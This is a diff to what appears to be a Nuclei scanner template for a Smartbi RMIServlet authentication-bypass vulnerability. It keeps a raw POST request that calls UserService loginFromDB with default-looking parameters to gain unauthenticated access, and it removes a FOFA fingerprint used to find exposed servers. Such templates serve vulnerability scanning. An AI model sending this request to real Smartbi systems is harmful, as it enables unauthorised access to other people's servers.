@@ -3,12 +3,8 @@ info:
   name: Smartbi RMIServlet 接口权限绕过漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aynegbsg0gowqwui'
+  description: ''
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: aynegbsg0gowqwui
-    fofa: body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"
 http:
 - raw:
   - 'POST /smartbi/vision/RMIServlet HTTP/1.1
@@ -18,8 +14,6 @@ http:
 
 
     Accept-Encoding: gzip
-
-
 
 
     className=UserService&methodName=loginFromDB&params=["service","0a"]
